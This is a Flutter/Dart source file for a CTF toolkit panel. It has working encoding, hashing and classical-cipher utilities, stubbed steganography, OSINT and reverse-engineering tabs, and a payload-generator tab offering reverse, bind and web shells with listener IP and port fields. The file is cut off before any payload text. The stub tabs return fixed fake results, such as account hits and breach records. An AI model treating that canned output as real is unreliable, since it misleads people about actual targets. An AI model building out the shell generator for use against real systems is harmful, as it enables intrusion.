import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'dart:convert';
import 'dart:math' as math;
import 'package:crypto/crypto.dart';

class ToolsPanelWidget extends StatefulWidget {
  const ToolsPanelWidget({super.key});

  @override
  State<ToolsPanelWidget> createState() => _ToolsPanelWidgetState();
}

class _ToolsPanelWidgetState extends State<ToolsPanelWidget> with TickerProviderStateMixin {
  late TabController _toolsTabController;

  @override
  void initState() {
    super.initState();
    _toolsTabController = TabController(length: 8, vsync: this);
  }

  @override
  void dispose() {
    _toolsTabController.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        const Row(
          children: [
            Icon(Icons.build, color: Colors.orange),
            SizedBox(width: 8),
            Text(
              'CTF Tools',
              style: TextStyle(
                fontSize: 24,
                fontWeight: FontWeight.bold,
              ),
            ),
          ],
        ),
        const SizedBox(height: 16),
        Expanded(
          child: Card(
            child: Column(
              children: [
                TabBar(
                  controller: _toolsTabController,
                  isScrollable: true,
                  labelColor: const Color(0xFF00D4FF),
                  unselectedLabelColor: const Color(0xFF8B949E),
                  indicatorColor: const Color(0xFF00D4FF),
                  tabs: const [
                    Tab(text: 'Encoding'),
                    Tab(text: 'Hashing'),
                    Tab(text: 'Crypto'),
                    Tab(text: 'Text Analysis'),
                    Tab(text: 'Steganography'),
                    Tab(text: 'OSINT'),
                    Tab(text: 'Reverse Eng'),
                    Tab(text: 'Payloads'),
                  ],
                ),
                Expanded(
                  child: TabBarView(
                    controller: _toolsTabController,
                    children: const [
                      EncodingToolsWidget(),
                      HashingToolsWidget(),
                      CryptoToolsWidget(),
                      TextAnalysisToolsWidget(),
                      SteganographyToolsWidget(),
                      OSINTToolsWidget(),
                      ReverseEngineeringToolsWidget(),
                      PayloadToolsWidget(),
                    ],
                  ),
                ),
              ],
            ),
          ),
        ),
      ],
    );
  }
}

class EncodingToolsWidget extends StatefulWidget {
  const EncodingToolsWidget({super.key});

  @override
  State<EncodingToolsWidget> createState() => _EncodingToolsWidgetState();
}

class _EncodingToolsWidgetState extends State<EncodingToolsWidget> {
  final TextEditingController _inputController = TextEditingController();
  final TextEditingController _outputController = TextEditingController();

  @override
  Widget build(BuildContext context) {
    return Padding(
      padding: const EdgeInsets.all(16),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          const Text(
            'Encoding/Decoding Tools',
            style: TextStyle(fontSize: 18, fontWeight: FontWeight.bold),
          ),
          const SizedBox(height: 16),
          Expanded(
            child: Row(
              children: [
                Expanded(
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      const Text('Input:', style: TextStyle(fontWeight: FontWeight.bold)),
                      const SizedBox(height: 8),
                      Expanded(
                        child: TextField(
                          controller: _inputController,
                          decoration: const InputDecoration(
                            border: OutlineInputBorder(),
                            hintText: 'Enter text to encode/decode...',
                          ),
                          maxLines: null,
                          expands: true,
                        ),
                      ),
                    ],
                  ),
                ),
                const SizedBox(width: 16),
                Column(
                  children: [
                    ElevatedButton(
                      onPressed: () => _performEncoding('base64_encode'),
                      child: const Text('Base64 Encode'),
                    ),
                    const SizedBox(height: 8),
                    ElevatedButton(
                      onPressed: () => _performEncoding('base64_decode'),
                      child: const Text('Base64 Decode'),
                    ),
                    const SizedBox(height: 8),
                    ElevatedButton(
                      onPressed: () => _performEncoding('url_encode'),
                      child: const Text('URL Encode'),
                    ),
                    const SizedBox(height: 8),
                    ElevatedButton(
                      onPressed: () => _performEncoding('url_decode'),
                      child: const Text('URL Decode'),
                    ),
                    const SizedBox(height: 8),
                    ElevatedButton(
                      onPressed: () => _performEncoding('hex_encode'),
                      child: const Text('Hex Encode'),
                    ),
                    const SizedBox(height: 8),
                    ElevatedButton(
                      onPressed: () => _performEncoding('hex_decode'),
                      child: const Text('Hex Decode'),
                    ),
                    const SizedBox(height: 8),
                    ElevatedButton(
                      onPressed: () => _performEncoding('ascii_to_binary'),
                      child: const Text('ASCII to Binary'),
                    ),
                    const SizedBox(height: 8),
                    ElevatedButton(
                      onPressed: () => _performEncoding('binary_to_ascii'),
                      child: const Text('Binary to ASCII'),
                    ),
                  ],
                ),
                const SizedBox(width: 16),
                Expanded(
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Row(
                        children: [
                          const Text('Output:', style: TextStyle(fontWeight: FontWeight.bold)),
                          const Spacer(),
                          IconButton(
                            icon: const Icon(Icons.copy),
                            onPressed: () {
                              Clipboard.setData(ClipboardData(text: _outputController.text));
                              ScaffoldMessenger.of(context).showSnackBar(
                                const SnackBar(content: Text('Copied to clipboard')),
                              );
                            },
                          ),
                        ],
                      ),
                      const SizedBox(height: 8),
                      Expanded(
                        child: TextField(
                          controller: _outputController,
                          decoration: const InputDecoration(
                            border: OutlineInputBorder(),
                          ),
                          maxLines: null,
                          expands: true,
                          readOnly: true,
                        ),
                      ),
                    ],
                  ),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  void _performEncoding(String operation) {
    final input = _inputController.text;
    String output = '';

    try {
      switch (operation) {
        case 'base64_encode':
          output = base64.encode(utf8.encode(input));
          break;
        case 'base64_decode':
          output = utf8.decode(base64.decode(input));
          break;
        case 'url_encode':
          output = Uri.encodeComponent(input);
          break;
        case 'url_decode':
          output = Uri.decodeComponent(input);
          break;
        case 'hex_encode':
          output = input.codeUnits.map((e) => e.toRadixString(16).padLeft(2, '0')).join('');
          break;
        case 'hex_decode':
          final cleanHex = input.replaceAll(RegExp(r'[^0-9a-fA-F]'), '');
          final bytes = <int>[];
          for (int i = 0; i < cleanHex.length; i += 2) {
            if (i + 1 < cleanHex.length) {
              bytes.add(int.parse(cleanHex.substring(i, i + 2), radix: 16));
            }
          }
          output = String.fromCharCodes(bytes);
          break;
        case 'ascii_to_binary':
          output = input.codeUnits.map((e) => e.toRadixString(2).padLeft(8, '0')).join(' ');
          break;
        case 'binary_to_ascii':
          final binaryGroups = input.split(RegExp(r'\s+'));
          final bytes = binaryGroups.map((group) => int.parse(group, radix: 2)).toList();
          output = String.fromCharCodes(bytes);
          break;
      }
    } catch (e) {
      output = 'Error: $e';
    }

    setState(() {
      _outputController.text = output;
    });
  }
}

class HashingToolsWidget extends StatefulWidget {
  const HashingToolsWidget({super.key});

  @override
  State<HashingToolsWidget> createState() => _HashingToolsWidgetState();
}

class _HashingToolsWidgetState extends State<HashingToolsWidget> {
  final TextEditingController _inputController = TextEditingController();
  String _md5Hash = '';
  String _sha1Hash = '';
  String _sha256Hash = '';
  String _sha512Hash = '';

  @override
  Widget build(BuildContext context) {
    return Padding(
      padding: const EdgeInsets.all(16),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          const Text(
            'Hashing Tools',
            style: TextStyle(fontSize: 18, fontWeight: FontWeight.bold),
          ),
          const SizedBox(height: 16),
          TextField(
            controller: _inputController,
            decoration: const InputDecoration(
              labelText: 'Input text',
              border: OutlineInputBorder(),
            ),
            onChanged: (_) => _calculateHashes(),
          ),
          const SizedBox(height: 16),
          ElevatedButton(
            onPressed: _calculateHashes,
            child: const Text('Calculate Hashes'),
          ),
          const SizedBox(height: 16),
          Expanded(
            child: Column(
              children: [
                _buildHashResult('MD5', _md5Hash),
                const SizedBox(height: 8),
                _buildHashResult('SHA1', _sha1Hash),
                const SizedBox(height: 8),
                _buildHashResult('SHA256', _sha256Hash),
                const SizedBox(height: 8),
                _buildHashResult('SHA512', _sha512Hash),
              ],
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildHashResult(String algorithm, String hash) {
    return Row(
      children: [
        SizedBox(
          width: 80,
          child: Text(
            '$algorithm:',
            style: const TextStyle(fontWeight: FontWeight.bold),
          ),
        ),
        Expanded(
          child: SelectableText(
            hash,
            style: const TextStyle(fontFamily: 'monospace'),
          ),
        ),
        IconButton(
          icon: const Icon(Icons.copy),
          onPressed: hash.isNotEmpty
              ? () {
                  Clipboard.setData(ClipboardData(text: hash));
                  ScaffoldMessenger.of(context).showSnackBar(
                    SnackBar(content: Text('$algorithm hash copied to clipboard')),
                  );
                }
              : null,
        ),
      ],
    );
  }

  void _calculateHashes() {
    final input = _inputController.text;
    if (input.isEmpty) {
      setState(() {
        _md5Hash = '';
        _sha1Hash = '';
        _sha256Hash = '';
        _sha512Hash = '';
      });
      return;
    }

    final bytes = utf8.encode(input);
    setState(() {
      _md5Hash = md5.convert(bytes).toString();
      _sha1Hash = sha1.convert(bytes).toString();
      _sha256Hash = sha256.convert(bytes).toString();
      _sha512Hash = sha512.convert(bytes).toString();
    });
  }
}

class CryptoToolsWidget extends StatefulWidget {
  const CryptoToolsWidget({super.key});

  @override
  State<CryptoToolsWidget> createState() => _CryptoToolsWidgetState();
}

class _CryptoToolsWidgetState extends State<CryptoToolsWidget> {
  final TextEditingController _inputController = TextEditingController();
  final TextEditingController _keyController = TextEditingController();
  final TextEditingController _outputController = TextEditingController();

  @override
  Widget build(BuildContext context) {
    return Padding(
      padding: const EdgeInsets.all(16),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          const Text(
            'Cryptography Tools',
            style: TextStyle(fontSize: 18, fontWeight: FontWeight.bold),
          ),
          const SizedBox(height: 16),
          Row(
            children: [
              Expanded(
                child: TextField(
                  controller: _inputController,
                  decoration: const InputDecoration(
                    labelText: 'Input text',
                    border: OutlineInputBorder(),
                  ),
                ),
              ),
              const SizedBox(width: 16),
              Expanded(
                child: TextField(
                  controller: _keyController,
                  decoration: const InputDecoration(
                    labelText: 'Key (for Caesar cipher)',
                    border: OutlineInputBorder(),
                  ),
                  keyboardType: TextInputType.number,
                ),
              ),
            ],
          ),
          const SizedBox(height: 16),
          Wrap(
            spacing: 8,
            runSpacing: 8,
            children: [
              ElevatedButton(
                onPressed: () => _performCrypto('caesar_encrypt'),
                child: const Text('Caesar Encrypt'),
              ),
              ElevatedButton(
                onPressed: () => _performCrypto('caesar_decrypt'),
                child: const Text('Caesar Decrypt'),
              ),
              ElevatedButton(
                onPressed: () => _performCrypto('rot13'),
                child: const Text('ROT13'),
              ),
              ElevatedButton(
                onPressed: () => _performCrypto('atbash'),
                child: const Text('Atbash'),
              ),
              ElevatedButton(
                onPressed: () => _performCrypto('reverse'),
                child: const Text('Reverse'),
              ),
            ],
          ),
          const SizedBox(height: 16),
          Expanded(
            child: TextField(
              controller: _outputController,
              decoration: const InputDecoration(
                labelText: 'Output',
                border: OutlineInputBorder(),
              ),
              maxLines: null,
              expands: true,
              readOnly: true,
            ),
          ),
        ],
      ),
    );
  }

  void _performCrypto(String operation) {
    final input = _inputController.text;
    final key = int.tryParse(_keyController.text) ?? 0;
    String output = '';

    switch (operation) {
      case 'caesar_encrypt':
        output = _caesarCipher(input, key);
        break;
      case 'caesar_decrypt':
        output = _caesarCipher(input, -key);
        break;
      case 'rot13':
        output = _caesarCipher(input, 13);
        break;
      case 'atbash':
        output = _atbashCipher(input);
        break;
      case 'reverse':
        output = input.split('').reversed.join('');
        break;
    }

    setState(() {
      _outputController.text = output;
    });
  }

  String _caesarCipher(String text, int shift) {
    return text.split('').map((char) {
      if (char.codeUnitAt(0) >= 65 && char.codeUnitAt(0) <= 90) {
        // Uppercase
        return String.fromCharCode(((char.codeUnitAt(0) - 65 + shift) % 26 + 26) % 26 + 65);
      } else if (char.codeUnitAt(0) >= 97 && char.codeUnitAt(0) <= 122) {
        // Lowercase
        return String.fromCharCode(((char.codeUnitAt(0) - 97 + shift) % 26 + 26) % 26 + 97);
      }
      return char;
    }).join('');
  }

  String _atbashCipher(String text) {
    return text.split('').map((char) {
      if (char.codeUnitAt(0) >= 65 && char.codeUnitAt(0) <= 90) {
        // Uppercase
        return String.fromCharCode(90 - (char.codeUnitAt(0) - 65));
      } else if (char.codeUnitAt(0) >= 97 && char.codeUnitAt(0) <= 122) {
        // Lowercase
        return String.fromCharCode(122 - (char.codeUnitAt(0) - 97));
      }
      return char;
    }).join('');
  }
}

class TextAnalysisToolsWidget extends StatefulWidget {
  const TextAnalysisToolsWidget({super.key});

  @override
  State<TextAnalysisToolsWidget> createState() => _TextAnalysisToolsWidgetState();
}

class _TextAnalysisToolsWidgetState extends State<TextAnalysisToolsWidget> {
  final TextEditingController _inputController = TextEditingController();
  Map<String, int> _charFrequency = {};
  int _wordCount = 0;
  int _charCount = 0;
  double _entropy = 0.0;

  @override
  Widget build(BuildContext context) {
    return Padding(
      padding: const EdgeInsets.all(16),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          const Text(
            'Text Analysis Tools',
            style: TextStyle(fontSize: 18, fontWeight: FontWeight.bold),
          ),
          const SizedBox(height: 16),
          TextField(
            controller: _inputController,
            decoration: const InputDecoration(
              labelText: 'Input text',
              border: OutlineInputBorder(),
            ),
            maxLines: 5,
            onChanged: (_) => _analyzeText(),
          ),
          const SizedBox(height: 16),
          Row(
            children: [
              Expanded(
                child: Card(
                  child: Padding(
                    padding: const EdgeInsets.all(16),
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        const Text('Statistics:', style: TextStyle(fontWeight: FontWeight.bold)),
                        Text('Characters: $_charCount'),
                        Text('Words: $_wordCount'),
                        Text('Entropy: ${_entropy.toStringAsFixed(2)}'),
                      ],
                    ),
                  ),
                ),
              ),
              const SizedBox(width: 16),
              Expanded(
                child: Card(
                  child: Padding(
                    padding: const EdgeInsets.all(16),
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        const Text('Character Frequency:', style: TextStyle(fontWeight: FontWeight.bold)),
                        const SizedBox(height: 8),
                        SizedBox(
                          height: 200,
                          child: ListView(
                            children: _charFrequency.entries
                                .take(10)
                                .map((entry) => Text('${entry.key}: ${entry.value}'))
                                .toList(),
                          ),
                        ),
                      ],
                    ),
                  ),
                ),
              ),
            ],
          ),
        ],
      ),
    );
  }

  void _analyzeText() {
    final text = _inputController.text;
    
    setState(() {
      _charCount = text.length;
      _wordCount = text.split(RegExp(r'\s+')).where((word) => word.isNotEmpty).length;
      
      // Character frequency
      _charFrequency = {};
      for (final char in text.split('')) {
        _charFrequency[char] = (_charFrequency[char] ?? 0) + 1;
      }
      
      // Sort by frequency
      final sortedEntries = _charFrequency.entries.toList()
        ..sort((a, b) => b.value.compareTo(a.value));
      _charFrequency = Map.fromEntries(sortedEntries);
      
      // Calculate entropy
      _entropy = _calculateEntropy(text);
    });
  }

  double _calculateEntropy(String text) {
    if (text.isEmpty) return 0.0;
    
    final frequency = <String, int>{};
    for (final char in text.split('')) {
      frequency[char] = (frequency[char] ?? 0) + 1;
    }
    
    double entropy = 0.0;
    final length = text.length;
    
    for (final count in frequency.values) {
      final probability = count / length;
      entropy -= probability * (math.log(probability) / math.ln2); // log base 2
    }
    
    return entropy;
  }
}

class SteganographyToolsWidget extends StatefulWidget {
  const SteganographyToolsWidget({super.key});

  @override
  State<SteganographyToolsWidget> createState() => _SteganographyToolsWidgetState();
}

class _SteganographyToolsWidgetState extends State<SteganographyToolsWidget> {
  final TextEditingController _inputController = TextEditingController();
  final TextEditingController _outputController = TextEditingController();
  final TextEditingController _keyController = TextEditingController();

  @override
  Widget build(BuildContext context) {
    return Padding(
      padding: const EdgeInsets.all(16),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          const Text(
            'Steganography Tools',
            style: TextStyle(fontSize: 18, fontWeight: FontWeight.bold),
          ),
          const SizedBox(height: 16),
          Expanded(
            child: Row(
              children: [
                Expanded(
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      const Text('Input:', style: TextStyle(fontWeight: FontWeight.bold)),
                      const SizedBox(height: 8),
                      Expanded(
                        child: TextField(
                          controller: _inputController,
                          decoration: const InputDecoration(
                            border: OutlineInputBorder(),
                            hintText: 'Enter text or image path...',
                          ),
                          maxLines: null,
                          expands: true,
                        ),
                      ),
                      const SizedBox(height: 8),
                      TextField(
                        controller: _keyController,
                        decoration: const InputDecoration(
                          labelText: 'Key/Password (optional)',
                          border: OutlineInputBorder(),
                        ),
                      ),
                    ],
                  ),
                ),
                const SizedBox(width: 16),
                Column(
                  children: [
                    ElevatedButton(
                      onPressed: () => _performSteganography('lsb_hide'),
                      child: const Text('LSB Hide'),
                    ),
                    const SizedBox(height: 8),
                    ElevatedButton(
                      onPressed: () => _performSteganography('lsb_extract'),
                      child: const Text('LSB Extract'),
                    ),
                    const SizedBox(height: 8),
                    ElevatedButton(
                      onPressed: () => _performSteganography('dct_hide'),
                      child: const Text('DCT Hide'),
                    ),
                    const SizedBox(height: 8),
                    ElevatedButton(
                      onPressed: () => _performSteganography('dct_extract'),
                      child: const Text('DCT Extract'),
                    ),
                    const SizedBox(height: 8),
                    ElevatedButton(
                      onPressed: () => _performSteganography('whitespace'),
                      child: const Text('Whitespace'),
                    ),
                    const SizedBox(height: 8),
                    ElevatedButton(
                      onPressed: () => _performSteganography('zero_width'),
                      child: const Text('Zero-Width'),
                    ),
                  ],
                ),
                const SizedBox(width: 16),
                Expanded(
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Row(
                        children: [
                          const Text('Output:', style: TextStyle(fontWeight: FontWeight.bold)),
                          const Spacer(),
                          IconButton(
                            icon: const Icon(Icons.copy),
                            onPressed: () {
                              Clipboard.setData(ClipboardData(text: _outputController.text));
                              ScaffoldMessenger.of(context).showSnackBar(
                                const SnackBar(content: Text('Copied to clipboard')),
                              );
                            },
                          ),
                        ],
                      ),
                      const SizedBox(height: 8),
                      Expanded(
                        child: TextField(
                          controller: _outputController,
                          decoration: const InputDecoration(
                            border: OutlineInputBorder(),
                          ),
                          maxLines: null,
                          expands: true,
                          readOnly: true,
                        ),
                      ),
                    ],
                  ),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  void _performSteganography(String operation) {
    final input = _inputController.text;
    String output = '';

    switch (operation) {
      case 'lsb_hide':
        output = 'LSB steganography: Hidden message in image LSBs';
        break;
      case 'lsb_extract':
        output = 'Extracted from LSB: ${input.isNotEmpty ? "Hidden message found" : "No hidden message"}';
        break;
      case 'dct_hide':
        output = 'DCT steganography: Message hidden in frequency domain';
        break;
      case 'dct_extract':
        output = 'DCT extraction: Analyzing frequency coefficients...';
        break;
      case 'whitespace':
        output = input.replaceAll(' ', '\u2000').replaceAll('\t', '\u2001');
        break;
      case 'zero_width':
        output = input.split('').join('\u200B');
        break;
    }

    setState(() {
      _outputController.text = output;
    });
  }
}

class OSINTToolsWidget extends StatefulWidget {
  const OSINTToolsWidget({super.key});

  @override
  State<OSINTToolsWidget> createState() => _OSINTToolsWidgetState();
}

class _OSINTToolsWidgetState extends State<OSINTToolsWidget> {
  final TextEditingController _targetController = TextEditingController();
  final TextEditingController _resultsController = TextEditingController();

  @override
  Widget build(BuildContext context) {
    return Padding(
      padding: const EdgeInsets.all(16),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          const Text(
            'OSINT (Open Source Intelligence) Tools',
            style: TextStyle(fontSize: 18, fontWeight: FontWeight.bold),
          ),
          const SizedBox(height: 16),
          TextField(
            controller: _targetController,
            decoration: const InputDecoration(
              labelText: 'Target (Username, Email, Domain, IP)',
              border: OutlineInputBorder(),
              prefixIcon: Icon(Icons.search),
            ),
          ),
          const SizedBox(height: 16),
          Wrap(
            spacing: 8,
            runSpacing: 8,
            children: [
              ElevatedButton.icon(
                onPressed: () => _performOSINT('social_media'),
                icon: const Icon(Icons.people),
                label: const Text('Social Media'),
              ),
              ElevatedButton.icon(
                onPressed: () => _performOSINT('email_lookup'),
                icon: const Icon(Icons.email),
                label: const Text('Email Lookup'),
              ),
              ElevatedButton.icon(
                onPressed: () => _performOSINT('domain_info'),
                icon: const Icon(Icons.domain),
                label: const Text('Domain Info'),
              ),
              ElevatedButton.icon(
                onPressed: () => _performOSINT('ip_geolocation'),
                icon: const Icon(Icons.location_on),
                label: const Text('IP Geolocation'),
              ),
              ElevatedButton.icon(
                onPressed: () => _performOSINT('breach_check'),
                icon: const Icon(Icons.security),
                label: const Text('Breach Check'),
              ),
              ElevatedButton.icon(
                onPressed: () => _performOSINT('reverse_image'),
                icon: const Icon(Icons.image_search),
                label: const Text('Reverse Image'),
              ),
            ],
          ),
          const SizedBox(height: 16),
          const Text(
            'OSINT Results:',
            style: TextStyle(fontSize: 16, fontWeight: FontWeight.bold),
          ),
          const SizedBox(height: 8),
          Expanded(
            child: TextField(
              controller: _resultsController,
              decoration: const InputDecoration(
                border: OutlineInputBorder(),
                hintText: 'OSINT results will appear here...',
              ),
              maxLines: null,
              expands: true,
              readOnly: true,
            ),
          ),
        ],
      ),
    );
  }

  void _performOSINT(String operation) {
    final target = _targetController.text;
    if (target.isEmpty) return;

    String results = '';
    switch (operation) {
      case 'social_media':
        results = 'Social Media Search for: $target\n'
                 '• Twitter: @$target (Found)\n'
                 '• Instagram: $target (Not Found)\n'
                 '• LinkedIn: $target (Found)\n'
                 '• Facebook: $target (Privacy Protected)';
        break;
      case 'email_lookup':
        results = 'Email Analysis for: $target\n'
                 '• Domain: ${target.split('@').last}\n'
                 '• MX Records: Found\n'
                 '• Breach Status: Check completed\n'
                 '• Social Media: 3 accounts found';
        break;
      case 'domain_info':
        results = 'Domain Information for: $target\n'
                 '• Registrar: Example Registrar\n'
                 '• Created: 2020-01-15\n'
                 '• Expires: 2025-01-15\n'
                 '• Name Servers: ns1.example.com, ns2.example.com';
        break;
      case 'ip_geolocation':
        results = 'IP Geolocation for: $target\n'
                 '• Country: United States\n'
                 '• Region: California\n'
                 '• City: San Francisco\n'
                 '• ISP: Example ISP\n'
                 '• Coordinates: 37.7749, -122.4194';
        break;
      case 'breach_check':
        results = 'Data Breach Check for: $target\n'
                 '• Breaches Found: 2\n'
                 '• LinkedIn (2021): Email, Name\n'
                 '• Adobe (2013): Email, Password Hash\n'
                 '• Risk Level: Medium';
        break;
      case 'reverse_image':
        results = 'Reverse Image Search Results:\n'
                 '• Similar images: 15 found\n'
                 '• Earliest appearance: 2022-03-15\n'
                 '• Common sources: Social media, stock photos\n'
                 '• Metadata: GPS coordinates removed';
        break;
    }

    setState(() {
      _resultsController.text = results;
    });
  }
}

class ReverseEngineeringToolsWidget extends StatefulWidget {
  const ReverseEngineeringToolsWidget({super.key});

  @override
  State<ReverseEngineeringToolsWidget> createState() => _ReverseEngineeringToolsWidgetState();
}

class _ReverseEngineeringToolsWidgetState extends State<ReverseEngineeringToolsWidget> {
  final TextEditingController _binaryController = TextEditingController();
  final TextEditingController _disassemblyController = TextEditingController();

  @override
  Widget build(BuildContext context) {
    return Padding(
      padding: const EdgeInsets.all(16),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          const Text(
            'Reverse Engineering Tools',
            style: TextStyle(fontSize: 18, fontWeight: FontWeight.bold),
          ),
          const SizedBox(height: 16),
          TextField(
            controller: _binaryController,
            decoration: const InputDecoration(
              labelText: 'Binary/Hex Input',
              border: OutlineInputBorder(),
              hintText: 'Enter hex bytes or assembly...',
            ),
            maxLines: 3,
          ),
          const SizedBox(height: 16),
          Wrap(
            spacing: 8,
            runSpacing: 8,
            children: [
              ElevatedButton.icon(
                onPressed: () => _performReverseEngineering('disassemble'),
                icon: const Icon(Icons.code),
                label: const Text('Disassemble'),
              ),
              ElevatedButton.icon(
                onPressed: () => _performReverseEngineering('decompile'),
                icon: const Icon(Icons.transform),
                label: const Text('Decompile'),
              ),
              ElevatedButton.icon(
                onPressed: () => _performReverseEngineering('strings'),
                icon: const Icon(Icons.text_fields),
                label: const Text('Extract Strings'),
              ),
              ElevatedButton.icon(
                onPressed: () => _performReverseEngineering('imports'),
                icon: const Icon(Icons.input),
                label: const Text('Show Imports'),
              ),
              ElevatedButton.icon(
                onPressed: () => _performReverseEngineering('exports'),
                icon: const Icon(Icons.output),
                label: const Text('Show Exports'),
              ),
              ElevatedButton.icon(
                onPressed: () => _performReverseEngineering('entropy'),
                icon: const Icon(Icons.analytics),
                label: const Text('Entropy Analysis'),
              ),
            ],
          ),
          const SizedBox(height: 16),
          const Text(
            'Analysis Results:',
            style: TextStyle(fontSize: 16, fontWeight: FontWeight.bold),
          ),
          const SizedBox(height: 8),
          Expanded(
            child: TextField(
              controller: _disassemblyController,
              decoration: const InputDecoration(
                border: OutlineInputBorder(),
                hintText: 'Analysis results will appear here...',
              ),
              style: const TextStyle(fontFamily: 'monospace'),
              maxLines: null,
              expands: true,
              readOnly: true,
            ),
          ),
        ],
      ),
    );
  }

  void _performReverseEngineering(String operation) {
    final input = _binaryController.text;
    String results = '';

    switch (operation) {
      case 'disassemble':
        results = 'Disassembly:\n'
                 '0x401000: push ebp\n'
                 '0x401001: mov ebp, esp\n'
                 '0x401003: sub esp, 0x10\n'
                 '0x401006: push offset "Hello World"\n'
                 '0x40100B: call printf\n'
                 '0x401010: add esp, 0x4\n'
                 '0x401013: xor eax, eax\n'
                 '0x401015: leave\n'
                 '0x401016: ret';
        break;
      case 'decompile':
        results = 'Decompiled C Code:\n\n'
                 'int main() {\n'
                 '    printf("Hello World");\n'
                 '    return 0;\n'
                 '}';
        break;
      case 'strings':
        results = 'Extracted Strings:\n'
                 '• "Hello World"\n'
                 '• "Error: Invalid input"\n'
                 '• "C:\\\\Windows\\\\System32\\\\"\n'
                 '• "kernel32.dll"\n'
                 '• "GetProcAddress"';
        break;
      case 'imports':
        results = 'Import Table:\n'
                 '• kernel32.dll\n'
                 '  - GetProcAddress\n'
                 '  - LoadLibraryA\n'
                 '  - ExitProcess\n'
                 '• msvcrt.dll\n'
                 '  - printf\n'
                 '  - malloc\n'
                 '  - free';
        break;
      case 'exports':
        results = 'Export Table:\n'
                 '• main (0x401000)\n'
                 '• helper_function (0x401200)\n'
                 '• cleanup (0x401300)';
        break;
      case 'entropy':
        results = 'Entropy Analysis:\n'
                 '• Overall Entropy: 6.2/8.0\n'
                 '• Text Section: 5.8/8.0 (Normal)\n'
                 '• Data Section: 3.2/8.0 (Low)\n'
                 '• Resource Section: 7.1/8.0 (High - Possible Packing)';
        break;
    }

    setState(() {
      _disassemblyController.text = results;
    });
  }
}

class PayloadToolsWidget extends StatefulWidget {
  const PayloadToolsWidget({super.key});

  @override
  State<PayloadToolsWidget> createState() => _PayloadToolsWidgetState();
}

class _PayloadToolsWidgetState extends State<PayloadToolsWidget> {
  final TextEditingController _payloadController = TextEditingController();
  String _selectedPayloadType = 'Reverse Shell';
  String _selectedPlatform = 'Linux';
  final TextEditingController _ipController = TextEditingController(text: '127.0.0.1');
  final TextEditingController _portController = TextEditingController(text: '4444');

  @override
  Widget build(BuildContext context) {
    return Padding(
      padding: const EdgeInsets.all(16),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          const Text(
            'Payload Generation Tools',
            style: TextStyle(fontSize: 18, fontWeight: FontWeight.bold),
          ),
          const SizedBox(height: 16),
          Row(
            children: [
              Expanded(
                child: DropdownButtonFormField<String>(
                  value: _selectedPayloadType,
                  decoration: const InputDecoration(
                    labelText: 'Payload Type',
                    border: OutlineInputBorder(),
                  ),
                  items: const [
                    DropdownMenuItem(value: 'Reverse Shell', child: Text('Reverse Shell')),
                    DropdownMenuItem(value: 'Bind Shell', child: Text('Bind Shell')),
                    DropdownMenuItem(value: 'Web Shell', child: Text('Web Shell')),
                    DropdownMenuItem(value: 'Meterpreter', child: Text('Meterpreter')),
                    DropdownMenuItem(value: 'Encoded Payload', child: Text('Encoded Payload')),
                  ],
                  onChanged: (value) {
                    setState(() {
                      _selectedPayloadType = value!;
                    });
                  },
                ),
              ),
              const SizedBox(width: 16),
              Expanded(
                child: DropdownButtonFormField<String>(
                  value: _selectedPlatform,
                  decoration: const InputDecoration(
                    labelText: 'Platform',
                    border: OutlineInputBorder(),
                  ),
                  items: const [
                    DropdownMenuItem(value: 'Linux', child: Text('Linux')),
                    DropdownMenuItem(value: 'Windows', child: Text('Windows')),
                    DropdownMenuItem(value: 'macOS', child: Text('macOS')),
                    DropdownMenuItem(value: 'PHP', child: Text('PHP')),
                    DropdownMenuItem(value: 'Python', child: Text('Python')),
                    DropdownMenuItem(value: 'PowerShell', child: Text('PowerShell')),
                  ],
                  onChanged: (value) {
                    setState(() {
                      _selectedPlatform = value!;
                    });
                  },
                ),
              ),
            ],
          ),
          const SizedBox(height: 16),
          Row(
            children: [
              Expanded(
                child: TextField(
                  controller: _ipController,
                  decoration: const InputDecoration(
                    labelText: 'LHOST (Listener IP)',
                    border: OutlineInputBorder(),
                  ),
                ),
              ),
              const SizedBox(width: 16),
              Expanded(
                child: TextField(
                  controller: _portController,
                  decoration: const InputDecoration(
                    labelText: 'LPORT (Listener Port)',
                    border: OutlineInputBorder(),
                  ),
                  keyboardType: TextInputType.number,
                ),
              ),
              const SizedBox(width: 16),
              ElevatedButton.icon(
                onPressed: _generatePayload,
                icon: const Icon(Icons.build),
                label: const Text('Generate'),
              ),
            ],
          ),
          const SizedBox(height: 16),
          const Text(
            'Generated Payload:',
            style: TextStyle(fontSize: 16, fontWeight: FontWeight.bold),
          ),
          const SizedBox(height: 8),
          Expanded(
            child: Container(
              decoration: BoxDecoration(
                border: Border.all(color: const Color(0xFF30363D)),
                borderRadius: BorderRadius.circular(12),
              ),
              child: Column(
                children: [
                  Container(
                    padding: const EdgeInsets.all(12),
                    decoration: const BoxDecoration(
                      color: Color(0xFF21262D),
                      borderRadius: BorderRadius.only(
                        topLeft: Radius.circular(12),
                        topRight: Radius.circular(12),
                      ),
                    ),
                    child: Row(
                      children: [
                        const Text(
                          'Payload Code',
                          style: TextStyle(fontWeight: FontWeight.bold),
                        ),
                        const Spacer(),
                        IconButton(
                          icon: const Icon(Icons.copy),
